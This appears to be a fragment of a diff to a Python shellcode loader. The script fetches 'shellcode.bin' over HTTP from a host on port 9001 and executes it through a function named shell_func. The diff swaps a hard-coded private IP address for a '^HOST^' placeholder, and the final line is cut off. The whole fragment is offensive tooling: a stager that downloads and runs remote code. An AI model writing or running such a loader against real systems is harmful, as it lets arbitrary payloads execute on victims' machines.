@@ -32,7 +32,7 @@ def run(shellcode):
     shell_func()
 
 if __name__ == '__main__':
-    url = "http://192.168.1.166:9001/shellcode.bin"
+    url = "http://^HOST^:9001/shellcode.bin"
     shellcode = get_code(url)
     run(shellcode
     
